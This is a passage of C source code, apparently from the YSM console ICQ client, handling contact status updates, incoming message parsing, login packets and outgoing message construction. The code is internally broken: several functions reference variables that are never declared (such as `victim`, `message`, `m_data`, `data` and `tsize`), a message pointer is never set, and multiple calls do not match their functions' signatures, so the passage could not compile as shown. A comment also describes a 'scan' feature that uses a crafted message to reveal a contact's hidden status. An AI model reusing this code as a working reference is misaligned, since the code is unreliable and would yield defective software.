    victim->d_con.rCookie    = dcinfo->rCookie;
    victim->d_con.version    = htons(dcinfo->version);

    if (flags & STATUS_FLBIRTHDAY)
    {
        if (victim->budType.birthday != 0x2)
            victim->budType.birthday = 0x1;
    }
    else
        victim->budType.birthday = FALSE;

    /* Fingerprint the remote client */
    switch (fprint)
    {
        case FINGERPRINT_MIRANDA_CLIENT:
        case FINGERPRINT_STRICQ_CLIENT:
        case FINGERPRINT_MICQ_CLIENT:
        case FINGERPRINT_LIB2K_CLIENT:
        case FINGERPRINT_YSM_CLIENT:
        case FINGERPRINT_YSM_CLIENT_CRYPT:
        case FINGERPRINT_TRILLIAN_CLIENT:
        case FINGERPRINT_MICQ2003A_CLIENT_1:
        case FINGERPRINT_MICQ2003A_CLIENT_2:
        case FINGERPRINT_MICQLITE_CLIENT:
            victim->fprint = fprint;
            break;

        /* maybe it was detected inside YSM_ParseCapabilities */
        /* but if its v8 lets say its an icq 2003 pro A */
        default:
            if (victim->d_con.version == 0x08)
                victim->fprint = FINGERPRINT_MICQ2003A_CLIENT_1;
            break;
    }

    if (victim->statusStr != NULL)
        YSM_FREE(victim->statusStr);

    victim->statusStr = statusStr;

    /* clear slave fields if its going offline. */
    if (status == STATUS_OFFLINE)
    {
        victim->caps   = 0;
        victim->fprint = 0;
    }

    /* Slave Timestamps */
    if (victim->status != status)
    {
        if (victim->status == STATUS_OFFLINE)
        {
            /* If it's the first time we see this
             * slave, don't update the status change.
             */

            if (victim->timing.signOn == 0)
                victim->timing.statusChange = 0;
            else
                victim->timing.statusChange = onsince;

            victim->timing.signOn = onsince;
        }
        else
        {
            victim->timing.statusChange = time(NULL);
        }
    }

    /* is the slave in our ignore list? don't bother us with their
     * status changes, we dont care, we might really hate that slave */

    if (victim->budType.ignoreId)
    {
        victim->status = status;
        return;
    }

    /* Fix for a known bug where the server keeps re-sending us */
    /* the status of each slave even though its the very same */
    /* unchanged */
    if (victim->status == status) return;

    /* are we in CHAT MODE ? we dont print messages which don't belong
     * to our chat session!. */
    if (g_state.promptFlags & FL_CHATM)
    {
        if (victim == NULL || !(victim->flags & FL_CHAT))
            return;
    }

    /* Is this slave's Birthday? */
    if (victim->budType.birthday == 0x1)
    {
        printfOutput(VERBOSE_BASE,
            "INFO BIRTHDAY %ld %s\n",
            victim->uin,
            victim->info.nickName);

        /* only inform once this way */
        victim->budType.birthday = 0x2;
    }

    /* Okie, now print the status change line */
    printfOutput(VERBOSE_STCHANGE,
        "INFO STATUS %ld %s %s\n",
        victim->uin,
        victim->info.nickName,
        strStatus(status));

    victim->status = status;
}

/*
 * The return value of this function should tell its caller if its
 * required to send an ACK, since certain m_types dont require ACKS.
 * ret = 0 -> something happened, error type normal (DC handles this)
 * ret < 0 -> something happened, error type critical (DC handles this)
 * ret = 1 -> everything went ok, dont send an ACK.
 * ret > 1 -> everything went ok, send an ACK.
 */

static int32_t YSM_ReceiveMessageData(
    slave_t       *sender,
    msg_type_t     msgType,
    uint8_t        msgFlags,
    const uint8_t *msgData,
    int16_t        msgLen)
{
    int8_t   *datap = NULL, *preason = NULL;
    int32_t   i = 0, c = 0, ret = 2;

    DEBUG_PRINT("from %dl, len: %d", sender->uin, msgLen);

    /* Are we in Antisocial mode? */
    if (victim == NULL && g_cfg.antisocial && msgType != YSM_MESSAGE_AUTH)
        return 0;

    sender->timing.lastMessage = time(NULL);

    switch (msgType)
    {
        case YSM_MESSAGE_NORMAL:
            g_state.lastRead = sender->uin;
            datap = msgData;
            break;

        case YSM_MESSAGE_AUTH:
            for (i = 0; i < msgLen; i++)
            {
                if ((uint8_t)message[i] == 0xfe) c++;

                /* on the 5th 0xfe we have the reason msg */
                if (c == 5) {
                    preason = strchr(message + i, 0xfe);
                    if (preason != NULL)
                        preason++;
                    else
                        preason = "No Reason";

                    /* Break out of the for loop! */
                    break;
                }
            }

            datap = preason;
            break;

        case YSM_MESSAGE_CONTACTS:
        case YSM_MESSAGE_URL:
            datap = msgData;
            break;

        case YSM_MESSAGE_ADDED:        /* these msgs lack of data */
        case YSM_MESSAGE_AUTHOK:
        case YSM_MESSAGE_AUTHNOT:
            datap = NULL;
            break;

        case YSM_MESSAGE_PAGER:
            datap = msgData + 1;
            break;

        case YSM_MESSAGE_GREET:
            /* only with slaves */
            if (victim != NULL)
            {
               /* we use m_data and not message here because these
                * messages had a blank LNTS before them. Tricky huh. */
                ret = YSM_DC_IncomingMessageGREET( victim,
                            msgType,
                            msgFlags,
                            m_data,
                            msgLen,
                            status);
            }
            return ret;

        case YSM_MESSAGE_FILE:
            /* only with slaves */
            if (victim != NULL)
            {
               /* This is done in v7, but, clients such as TRILLIAN
                * who identify theirselves as v8 clients, still send
                * this. What a pain in the ass man, come on!.
                */
                ret = YSM_DC_IncomingMessageFILE(victim,
                    msgType,
                    msgFlags,
                    m_data,
                    msgLen,
                    status);
            }
            return ret;

        default:
            printfOutput(VERBOSE_MOATA,
                "YSM_ReceiveMessageData: Unknown msgType received.\n");

            return 1;
    }

    YSM_DisplayMsg(
        sender,
        msgType,
        msgLen,
        datap,
        msgFlags);

    return ret;
}

void YSM_ReceiveMessageType1(bsd_t bsd, slave_t *sender)
{
    int8_t    *msgPtr = NULL;
    uint16_t   msgLen = 0;
    uint8_t    msgFlags = 0;
    uint16_t   dataLen = 0;
    tlv_t      tlv;
    bs_pos_t   startPos;
    bs_pos_t   msgPos;
    bs_pos_t   pos;
    uint8_t    charsetNumber = 0;

    DEBUG_PRINT("");

    bsReadTlv(bsd, &tlv);

    if (tlv.type != 2)
        return;

    dataLen = tlv.len;
    hexDumpOutput(bsGetPtr(bsd), tlv.len);
    startPos = bsTell(bsd);

    /* to have a limit in case anything happens */
    while (bsTell(bsd) - startPos < dataLen 
           && bsReadTlv(bsd, &tlv) == SIZEOF_TLV)
    {
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            case 0x0101:      /* Message TLV */
                msgLen = tlv.len - 4;

                /* here comes encoding information:
                    0x0000 -> US-ASCII
                    0x0002 -> UCS-2BE
                 */

                bsReadWord(bsd, &charsetNumber);
                bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR); /* charset subset */

                if (charsetNumber == 0x2)
                {
                    /* its UTF-16 (UCS-2BE) */
                    msgFlags |= MFLAGTYPE_UCS2BE;
                }
                msgPos = bsTell(bsd);
                break;

            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    if (msgPtr != 0)
    {
        /* only normal messages come in type1 */
        YSM_ReceiveMessageData(bsd, sender, 0x01, msgFlags, msgLen, msgPtr);
    }
}

/* This function can be called from DC PEER_MSGs as well as from
 * ReceiveMessageType2() since the main type2 message body is
 * the same for both. If dc_flag is TRUE, it was called from DC.
 */

int32_t YSM_ReceiveMessageType2Common(
    slave_t    *victim,
    int32_t     tsize,
    uint8_t   *data,
    uin_t       uin,
    uint16_t   r_status,
    int8_t     *m_id,
    uint8_t    m_flags,
    uint16_t  *msgSeq,
    int8_t      dc_flag)
{
    int8_t      m_len[2], m_priority[2], *pguid = NULL;
    msg_type_t  msgType = YSM_MESSAGE_UNDEF;
    int16_t     m_status = 0;
    int32_t     ret = TRUE;

    DEBUG_PRINT("");

    tsize += 2;    /* Some Length        */
    readUint16LE(msgSeq, data + tsize);
    tsize += 2;    /* SEQ2            */
    tsize += 12;   /* Unknown         */

    msgType = data[tsize];
    tsize += 2;    /* Msg Type+flags    */
    memcpy(&m_status, data + tsize, 2);
    tsize += 2;    /* Status        */
    memcpy(&m_priority, data + tsize, 2);
    tsize += 2;    /* Priority        */
    memcpy(&m_len, data + tsize, 2);
    tsize += 2;    /* Msg Length        */

    /* empty messages sent by icq 2002/2001 clients are ignored */
    if ((Chars_2_Word(m_len) <= 0x1)
    && m_priority[0] == 0x02  && m_priority[1] == 0x00)
    {
        return ret;
    }

    /* after the message data, there might be a GUID identifying
     * the type of encoding the sent message is in.
     * if the message type is a MESSAGE, GUIDs come after
     * 8 bytes of colors (fg(4) + bg(4))
     */
    pguid = data+tsize+Chars_2_Word(m_len);
    if (msgType == YSM_MESSAGE_NORMAL) pguid += 8;

    if ((uint32_t)(*pguid) == 0x26    /* size of the UTF8 GUID */
    && !memcmp(pguid+4, CAP_UTF8_GUID, sizeof(CAP_UTF8_GUID))) {
        m_flags |= MFLAGTYPE_UTF8;
    }

    if (dc_flag) /* dirty hack for ICQ 2003a, thanks samm at os2 dot ru */
        m_flags |= MFLAGTYPE_UTF8;

    /* m_status in type2 messages depending on the message subtype
     * will be the user'status or the message status.
     */

    ret = YSM_ReceiveMessageData(victim,
        uin,
        m_status,
        msgType,
        m_flags,
        Chars_2_Word(m_len),
        data+tsize);

    if (ret > 1)
    {
        if (!dc_flag)
            sendAckType2(uin, *msgSeq, msgType, m_id);
        else
            YSM_DC_MessageACK(victim, msgType);
    }

    return ret;
}

void YSM_ReceiveMessageType2(
    bsd_t     bsd,
    uin_t     uin,
    uint16_t  status,
    uint8_t  *msgId)
{
    int32_t    MsgTLV = 0;
    int16_t    tmplen = 0, cmd = 0;
    int8_t     foundtlv = FALSE, m_type[4];
    uint16_t  msgSeq;
    uint8_t   m_flags = 0;
    tlv_bit_t  thetlv;

    memset( &thetlv, '\0', sizeof(tlv_bit_t) );
    memcpy( &thetlv, data+tsize, sizeof(tlv_bit_t));
    MsgTLV = Chars_2_Wordb(thetlv.len);
    MsgTLV += tsize;

    /* Skip the first 0x5 TLV */
    tsize += sizeof(tlv_bit_t);
    memcpy( &cmd, data+tsize, 2 );
    tsize += 2;        /* ACK TYPE */
                /* 0x0000 -> Text Message    */
                /* 0x0001 -> Abort Request    */
                /* 0x0002 -> File ACK        */

    switch (cmd)
    {
        case 0x0000:
            m_flags |= MFLAGTYPE_NORM;
            break;

        case 0x0001:
            m_flags |= MFLAGTYPE_END;
            break;

        case 0x0002:
            m_flags |= MFLAGTYPE_ACK;
            break;

        default:
            printfOutput( VERBOSE_MOATA,
                "ReceiveMessageType2: unknown cmd(%d).\n",
                 cmd );
            return;
    }

    tsize += 8;        /* timestamp + random msg id */
    tsize += 16;        /* capabilities */

    /* to have a limit in case anything happends */
    while (!foundtlv && tsize < MsgTLV)
    {
        memset( &thetlv, '\0', sizeof(tlv_bit_t) );
        memcpy( &thetlv, data+tsize, sizeof(tlv_bit_t));
                tsize += sizeof(tlv_bit_t);
                tmplen = Chars_2_Wordb(thetlv.len);

        switch (Chars_2_Wordb(thetlv.type))
        {
            case 0x2711:      /* Message C TLV */
                tsize += 2;    /* len till SEQ1    */
                tsize += 2;    /* TCP Version #    */
                tsize += 16;    /* Capabilities        */
                tsize += 3;    /* Unknown        */
                memcpy( &m_type, data+tsize, 4 );
                tsize += 4;    /* 0x00000000 -> Normal Msg
                           0x00000004 -> File OK/Req */

                tsize += 2;    /* SEQ1            */
                foundtlv=TRUE;
                break;

            case 0x3:
                tsize += tmplen;
                break;

            case 0x5:
                tsize += tmplen;
                break;

            case 0x4:
                tsize += tmplen;
                break;

            default:
                tsize += tmplen;
                break;
        }
    }

    /* No boy, get out now */
    if (!foundtlv) return;

    YSM_ReceiveMessageType2Common(
        bsd,
        uin,
        r_status,
        msgId,
        m_flags,
        &msgSeq,
        0x00);
}

void YSM_ReceiveMessageType4(bsd_t bsd, slave_t *sender)
{
    uint16_t    msgLen;
    msg_type_t  msgType;
    tlv_t       tlv5;
    uin_t       yetAnotherUin;

    DEBUG_PRINT("");

    bsReadTlv(bsd, &tlv5);

    if (tlv5.type != 0x5)
        return;

    bsReadDwordLE(bsd, &yetAnotherUin);

    if (yetAnotherUin != sender->uin)
    {
        DEBUG_PRINT("uins have not equal (%ld != %ld)", sender->uin, yetAnotherUin);
    }

    bsReadByte(bsd, &msgType);
    bsSeek(bsd, SIZEOF_BYTE, BS_SEEK_CUR);    /* Msg flags */
    bsReadWordLE(bsd, &msgLen);

    YSM_ReceiveMessageData(bsd, sender, msgType, 0x00, msgLen, ptr);
}

void YSM_ReceiveMessage(flap_head_t *flap, bsd_t bsd)
{
    uint16_t  warnLevel;
    uint16_t  tlvCount;
    uint16_t  msgChannel;
    uint16_t  statusFlags;
    uint16_t  status;
    uint8_t   msgId[8];
    uin_t     uin;
    int8_t   *strUin = NULL;
    int8_t    uinLen = 0;
    tlv_t     tlv;
    bs_pos_t  pos;
    slave_t   slave;
    slave_t  *sender;

    DEBUG_PRINT("");

    bsRead(bsd, msgId, sizeof(msgId));
    bsReadWord(bsd, &msgChannel);
    bsReadByte(bsd, &uinLen);

    strUin = YSM_CALLOC(1, uinLen+1);
    if (!strUin || uinLen+1 < 1) return;

    bsRead(bsd, strUin, uinLen);
    uin = atol(strUin);
    YSM_FREE(strUin);

    bsReadWord(bsd, &warnLevel);
    bsReadWord(bsd, &tlvCount);

    /* When there is no data, we just get a single TLV */
    /* to avoid any problems, we analyze the packet right now */

    if (tlvCount == 0)
    {
        /* weird it is..but it seems WWP messages sent through icq.com carry not TLVs..
         * we'll make a sanity check anyway only allowing messages type 4..
         */
        if (msgChannel == 0x4)
        {
            YSM_ReceiveMessageType4(bsd, uin, status);
        }
        return;
    }

    for (; tlvCount > 0 && bsReadTlv(bsd, &tlv) == SIZEOF_TLV; tlvCount--)
    {
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            case 0x06:      /* senders status */
                bsReadWord(bsd, &statusFlags);
                bsReadWord(bsd, &status);
                break;

            case 0x03:      /* user login timestamp */
            case 0x13:      /* no idea what this is, just yet */
            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    if ((sender = querySlave(SLAVE_UIN, 0, uin, 0)) == NULL)
    {
        /* initialize not a slave */
        sender = &slave;
        memset(slave, 0, sizeof(slave));
        strncpy(slave.info.nickName, NOT_A_SLAVE, sizeof(slave.info.nickName));
        slave.uin = uin;
        slave.status = status;
    }


    DEBUG_PRINT("uin = %ld", uin);

    switch (msgChannel)
    {
        case 0x01:    /* Normal Msg. */
            YSM_ReceiveMessageType1(bsd, sender);
            break;

        case 0x02:    /* Complex Msg, yack! */
            YSM_ReceiveMessageType2(bsd, sender, msgId);
            break;

        case 0x04:    /* Utility Msg. */
            YSM_ReceiveMessageType4(bsd, sender);
            break;

        default:
            printfOutput(VERBOSE_MOATA,
                "INFO DEBUG Unknown type (0x%.2X) received.\n",
                msgChannel);
            break;
    }
}

void sendAckType2(
    uin_t       uin,
    uint16_t    msgSeq,
    msg_type_t  msgType,
    int8_t     *msgId)
{
    bsd_t bsd;

    bsd = initBs();

    bsAppend(bsd, msgId, 8);                 /* msg-id cookie */
    bsAppendWord(bsd, 0x0002);                  /* message channel */
    bsAppendPrintfString08(bsd, "%ld", uin);    /* screenname string08 */
    bsAppendWord(bsd, 0x0003);                  /* reason code */
    
    bsAppendWordLE(bsd, 0x1B);                  /* length of following data */
    bsAppendWordLE(bsd, YSM_PROTOCOL_VERSION);  /* protocol version */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16);
    bsAppendWord(bsd, 0x0000);                  /* unknown */
    bsAppendDwordLE(bsd, 0x00000003);           /* client capabilities flag */
    bsAppendByte(bsd, 0x00);                    /* unknown */
    bsAppendWordLE(bsd, msgSeq);                /* seq? */

    bsAppendWordLE(bsd, 0x0E);                  /* length of following data */
    bsAppendWordLE(bsd, msgSeq);                /* seq? */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0", 12);

    bsAppendWordLE(bsd, msgType);               /* message type */
    bsAppendWordLE(bsd, 0x0000);                /* status code */
    bsAppendWordLE(bsd, 0x0000);                /* priority code */
    bsAppendWordLE(bsd, 0x01);                  /* message string length */
    bsAppendByte(bsd, 0x00);                    /* message asciiz */
    bsAppendDwordLE(bsd, 0x00000000);           /* text color */
    bsAppendDwordLE(bsd, 0x00FFFFFF);           /* background color */

    sendSnac(0x04, 0x0b, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0x0B);

    freeBs(bsd);
}


/* LoginSequence takes care of logging in to the Authentication
 * server, getting the cookie, and logging in to the BOS server.
 */

int32_t YSM_LoginSequence(uin_t uin, int8_t *password)
{
    uint32_t    datasize = 0, pos = 0;
    int32_t      r = 0;
    int8_t      *data = NULL, suin[MAX_UIN_LEN+1], *buf = NULL;
    tlv_bit_t        thetlv;
    snac_head_t    snac;
    flap_head_bit_t    head;

    /* First send a 17,6 SNAC. This way, we request a random
     * key from the server in order to do an MD5 login.
     */

    snprintf(suin, MAX_UIN_LEN, "%d", (int)uin);
    suin[sizeof(suin) - 1] = 0x00;

    datasize = sizeof(tlv_bit_t) + strlen(suin);    /* screen name */
    datasize += sizeof(tlv_bit_t);        /* unknown */
    datasize += sizeof(tlv_bit_t);        /* unknown */

    data = ysm_calloc(1, datasize, __FILE__, __LINE__);
    memset(&thetlv, 0, sizeof(tlv_bit_t));

    Word_2_Charsb(thetlv.type, 0x1);
    Word_2_Charsb(thetlv.len, strlen(suin));

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    memcpy(data+pos, suin, strlen(suin));
    pos += strlen(suin);

    Word_2_Charsb(thetlv.type, 0x4B);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    Word_2_Charsb(thetlv.type, 0x5A);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    if (sendSnac(17, 6, 0x0, data, pos, g_sinfo.seqnum++, 0) < 0)
    {
        return -1;
    }

    YSM_FREE(data);

    /* ok we sent the first SNAC, we have to receive 17, 07
     * as a valid response
     */

    memset(&head, 0, sizeof(head));

    r = YSM_READ(YSM_USER.network.rSocket,
            &head,
            FLAP_HEAD_SIZE,
            0);

    if (r < 1 || r != FLAP_HEAD_SIZE) return -1;

    buf = YSM_CALLOC(1, Chars_2_Wordb(head.dlen)+1);

    r = YSM_READ(YSM_USER.network.rSocket,
        buf,
        Chars_2_Wordb(head.dlen),
        0 );

    if (r < 1 || r != Chars_2_Wordb(head.dlen)) return -1;

    readSnac(&snac, buf);

    if (snac.reqId == 0x23) return 1;

    return 0;
}

void YSM_Init_LoginA(uin_t uin, uint8_t *password)
{
    flap_head_bit_t   head;
    uint8_t    buf[4];
    uint8_t    passwdStr[strlen(password)];
    uint8_t    profile[] = "ICQ Inc. - Product of ICQ (TM).2003a.5.47.1.3800.85";
    uint32_t   distrNum = 0x55;
    uint16_t   clientId = 0x10A;
    uint16_t   majorVer = 0x5;
    uint16_t   minorVer = 0x2F;
    uint16_t   lesserVer = 0x1;
    uint16_t   buildNum = 0x0ED8;
    uint32_t   r = 0;
    bsd_t      bsd;
    bs_pos_t   tlv;
    bs_pos_t   flap;

    memset(&head, '\0', sizeof(head));
    memset(buf, '\0', 4);

    r = YSM_READ(YSM_USER.network.rSocket,
            &head,
            FLAP_HEAD_SIZE,
            1);

    if (r < FLAP_HEAD_SIZE) return;

    r = YSM_READ(YSM_USER.network.rSocket,
            &buf,
            sizeof(buf),
            1);

    if (r < (int32_t)sizeof(buf)) return;

    /* El server nos manda listo para login en la data 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        bsd = initBs();

        flap = bsAppendFlapHead(bsd, head.channelID,
                                Chars_2_Wordb(head.seq)+1, 0);

        /* We copy the 0001 as reply  */
        bsAppend(bsd, buf, 4);

        /* TLV type 1: screen name (uin) */
        tlv = bsAppendTlv(bsd, 0x1, 0, NULL);
        bsAppendPrintfString(bsd, "%ld", uin);
        bsUpdateTlvLen(bsd, tlv);

        memset(passwdStr, '\0', sizeof(passwdStr));
        EncryptPassword(password, passwdStr);

        /* TLV type 2: roasted password */
        /* roasted password may contains zero bytes so we should use
         * length of plain password */
        bsAppendTlv(bsd, 0x2, strlen(password), passwdStr);

        /* TLV type 3: client id string */
        bsAppendTlv(bsd, 0x3, strlen(profile), profile);

        /* TLV type 16: client id */
        bsAppendTlv(bsd, 0x16, 2, NULL);
        bsAppendWord(bsd, clientId);

        /* TLV type 17: client major version */
        /* major version 4 icq2000 5 icq2001 */
        bsAppendTlv(bsd, 0x17, 2, NULL);
        bsAppendWord(bsd, majorVer);

        /* Estos que siguen son valores que supongo que no importan */
        /* que tienen, pero todos son WORD. */
        bsAppendTlv(bsd, 0x18, 2, NULL);
        bsAppendWord(bsd, minorVer);
        bsAppendTlv(bsd, 0x19, 2, NULL);
        bsAppendWord(bsd, lesserVer);
        bsAppendTlv(bsd, 0x1A, 2, NULL);
        bsAppendWord(bsd, buildNum);
        bsAppendTlv(bsd, 0x14, 4, NULL);
        bsAppendDword(bsd, distrNum);

        /* and the final 4 bytes - Language and Country */
        bsAppendTlv(bsd, 0x0F, 2, "en");     /* TLV type 0F */
        bsAppendTlv(bsd, 0x0E, 2, "us");     /* TLV type 0E */

        bsUpdateFlapHeadLen(bsd, flap);

        /* Cruzar dedos y mandar el paquete de Login -A- */
        writeBs(YSM_USER.network.rSocket, bsd);

        printfOutput(VERBOSE_MOATA, "Login A Sent to the Server\n");

        freeBs(bsd);
        g_state.reconnecting = FALSE;
    }
    else
    {
        printfOutput(VERBOSE_MOATA,
             "Login Init A Failure, bad Server Response.\n"
             "The reply should have been 0001. Exiting..\n");
        YSM_ERROR(ERROR_CRITICAL, 1);
    }
}

void loginSendCookie(uint8_t *buff, uint16_t cookieLen)
{
    flap_head_bit_t  head;
    uint8_t    buf[4];
    bsd_t      bsd;
    bs_pos_t   flap;

    DEBUG_PRINT("");

    if (buff == NULL)
        return;

    memset(&head, '\0', sizeof(head));
    memset(buf, '\0', 4);

    recv(YSM_USER.network.rSocket, (char *)&head, sizeof(head), 0);
    recv(YSM_USER.network.rSocket, &buf[0], 4, 0);

    /* aca tambien el server nos manda el 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        bsd = initBs();

        /* flap header */
        flap = bsAppendFlapHead(
                bsd, head.channelID, Chars_2_Wordb(head.seq)+1, 0);

        /* copy the 0001 as reply */
        bsAppend(bsd, buf, 4);

        /* TLV type 6 THE COOKIE! */
        bsAppendTlv(bsd, 0x06, cookieLen, buff);

        bsUpdateFlapHeadLen(bsd, flap);

        /* Cruzar dedos y mandar el packet de Login -B (la cookie)- */
        writeBs(YSM_USER.network.rSocket, bsd);

        freeBs(bsd);
    }
    else
    {
        printfOutput(VERBOSE_MOATA,
            "Weird, When we were going to send the cookie, we didnt receive\n"
            "the 0001 from the server. So its an error, and we are quitting..\n");
        YSM_ERROR(ERROR_CRITICAL, 1);
    }
}


/*
sendUpdatePrivacy possible settings are:

0x1 : Allow all users to see you.
0x2 : Block all users from seeing you. (Even the visible)
0x3 : Block all users but the Visible list from seeing you.
0x4 : Block users on your deny list.
0x5 : Only allow users in your buddy list.
*/

void sendUpdatePrivacy(uint8_t setting)
{
    bsd_t bsd;

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    bsd = initBs();
    bsAppendWord(bsd, 0);                        /* empty item name string16 */
    bsAppendWord(bsd, 0);                        /* grpId == 0, Master Group! */
    bsAppendWord(bsd, g_sinfo.blprivacygroupid); /* item id # */
    bsAppendWord(bsd, 0x0004);                   /* Type == 0x0004 */

    /* Len is a fixed size (sizeof(tlv_bit_t) == 4, + Flag == 1 )    */
    bsAppendWord(bsd, 0x0005); /* len */
    bsAppendTlv(bsd, 0xCA, 1, NULL);
    bsAppendByte(bsd, setting);

    sendSnac(0x13, 0x09, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0x09 | ((g_sinfo.blentries & 0xFF) << 16));

    freeBs(bsd);
}

int32_t YSM_ChangeStatus(uint16_t status)
{
    bsd_t bsd;

    /* autoaway is always overriden when calling ChangeStatus.
     * hence, autoaway MUST be set AFTER the call for away status change.
     */

    bsd = initBs();
    g_state.promptFlags &= ~FL_AUTOAWAY;

    bsAppendTlv(bsd, 0x06, 0x04, NULL);       /* TLV 0x6 */
    bsAppendWord(bsd, YSM_USER.status_flags); /* status flags */
    bsAppendWord(bsd, status);                /* status */

    bsAppendTlv(bsd, 0x08, 0x02, "\0\0");     /* TLV 0x8 */

    /* TLV 0xC - Direct Connections - */
    bsAppendTlv(bsd, 0x0C, 0x25, NULL);

    if (!g_cfg.dcdisable)
    {
        bsAppendDword(bsd, YSM_USER.d_con.rIP_int);
        bsAppendDword(bsd, (uint32_t)YSM_USER.d_con.rPort);
    }
    else
    {
        bsAppendDword(bsd, 0);
        bsAppendDword(bsd, 0);
    }

    bsAppendByte(bsd, 0x04);    /* DC flag */

    /* 0x01 for FW, 0x04 for */

    bsAppendWord(bsd, YSM_PROTOCOL_VERSION);

    bsAppendDword(bsd, 0);    /* Connection Cookie */
    /* TODO: This could be important, if we set a cookie    */
    /* here, maybe its the cookie required by any client    */
    /* to connect to us. So we could check if the client    */
    /* connecting to us, ever connected to the icq server    */
    /* (that way, a unique real client)            */

    bsAppendDword(bsd, 0x50); /* web front port */
    bsAppendDword(bsd, 0x03); /* client futures */

    bsAppendDwordLE(bsd, FINGERPRINT_YSM_CLIENT); /* YSM Fingerprint */ 
    bsAppendDword(bsd, 0);
    bsAppendDwordLE(bsd, FINGERPRINT_YSM_CLIENT_CRYPT);
    bsAppendWord(bsd, 0); /* unknown */

    sendSnac(YSM_BASIC_SERVICE_SNAC, 0x1E, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++, 0);

    if (status == STATUS_INVISIBLE)
    {
        sendUpdatePrivacy(0x3);
    }
    else if (YSM_USER.status == STATUS_INVISIBLE)
    {
        /* Were in Invisible and changing to something else
         * we choose 0x4 as default, since it blocks people
         * in the deny list..a common request huh
         */
        sendUpdatePrivacy(0x4);
    }

    YSM_USER.status = status;
    freeBs(bsd);

    return status;
}

int32_t sendMessage2Client(
    slave_t   *victim,
    uin_t      uin,
    int16_t    msgFormat,
    int32_t    msgType,
    int8_t    *msgData,
    int32_t    msgLen,
    uint8_t    msgFlags,
    uint8_t    sendFlags,
    uint32_t   reqId)
{
    uint32_t   msgTime = 0;
    uint32_t   msgId = 0;
    bsd_t      bsd;

    msgTime = rand() % 0xffff;
    msgId = rand() % 0xffff;

    bsd = initBs();

    bsAppendMessageHead(bsd, uin, msgFormat, msgTime, msgId);

    switch (msgFormat)
    {
        case 0x1:
            bsAppendMessageBodyType1(bsd, victim, msgData, msgLen);
            break;

        case 0x2:
            bsAppendMessageBodyType2(bsd,
                victim,
                msgData,
                msgLen,
                msgType,
                msgTime,
                msgId,
                msgFlags,
                sendFlags);
            break;

        case 0x4:
            bsAppendMessageBodyType4(bsd, msgData, msgLen, msgType, msgFlags);
            break;

        default:
            /* unrecognized message type */
            freeBs(bsd);
            return -1;
    }

    /* last empty tlv */
    switch (msgFormat)
    {
        case 0x2:
            /* the scan thingie gets buggy when we send a 3
             * instead of a 6. (as we should). This isn't tidy.
             * scan uses a unique msgFlags of 0x19
             */
            if (msgFlags == 0x19)
                bsAppendTlv(bsd, 0x06, 0, NULL);
            else
                bsAppendTlv(bsd, 0x03, 0, NULL);
            break;

        default:
            bsAppendTlv(bsd, 0x06, 0, NULL);
            break;
    }

    sendSnac(YSM_MESSAGING_SNAC, YSM_MESSAGE_FROM_CLIENT, 0x00,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        reqId);

    freeBs(bsd);

    return 0;
}

void bsAppendMessageHead(
    bsd_t      bsd,
    uin_t      uin,
    int16_t    msgFormat,
    uint32_t  msgTime,
    uint32_t  msgId)
{
    bsAppendDword(bsd, msgTime);                /* mtimestamp */
    bsAppendDword(bsd, msgId);                  /* mID */
    bsAppendWord(bsd, msgFormat);               /* msg sending type */
    bsAppendPrintfString08(bsd, "%ld", uin);    /* uin string08 */
}

void bsAppendMessageBodyType1(
    bsd_t    bsd,
    slave_t *victim,
    int8_t  *msgData,
    int32_t  msgLen)
{
    bs_pos_t tlv2;
    bs_pos_t tlv257;

    tlv2 = bsAppendTlv(bsd, 0x02, 0, NULL);

    /* 0x05 frag id (array of req. capabilities) */
    /* 0x01 fragment version */
    bsAppendTlv(bsd, 0x0501, 1, NULL);
    bsAppendByte(bsd, 0x01);       /* byte array of req. capab. (1 - text) */

    /* 0x01 fragment id (text message) */
    /* 0x01 fragment version */
    tlv257 = bsAppendTlv(bsd, 0x0101, 0, NULL);
    if (victim && victim->caps & CAPFL_UTF8)
        bsAppendWord(bsd, ICBM__IM_SECTION_ENCODINGS_UNICODE); /* encoding */
    else
        bsAppendWord(bsd, ICBM__IM_SECTION_ENCODINGS_ASCII);   /* encoding */
    bsAppendWord(bsd, 0x0);                                    /* language */
    bsAppend(bsd, msgData, msgLen);

    bsUpdateTlvLen(bsd, tlv257);
    bsUpdateTlvLen(bsd, tlv2);
}

void bsAppendMessageBodyType2(
    bsd_t        bsd,
    slave_t     *victim,
    int8_t      *msgData,
    int32_t      msgLen,
    int32_t      msgType,
    uint32_t    msgTime,
    uint32_t    msgId,
    uint8_t     msgFlags,
    uint8_t     sendFlags)
{
    bs_pos_t tlv5;
    bs_pos_t tlv2711;

    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL); /* TVL 0x05: rendezvous msg data */
    bsAppendWord(bsd, 0x00);           /* ack type 0 - normal msg */
    bsAppendDword(bsd, msgTime);       /* copy of head timestamp */
    bsAppendDword(bsd, msgId);         /* copy of head mID */

    /* FIXME: this is aweful. since the scan commands uses a 'specially'
     * crafted message in order to reveal someones real status..and we
     * really dont want to add another parameter nor function for it.
     * we have to code the following aweful comparisons against msgFlags
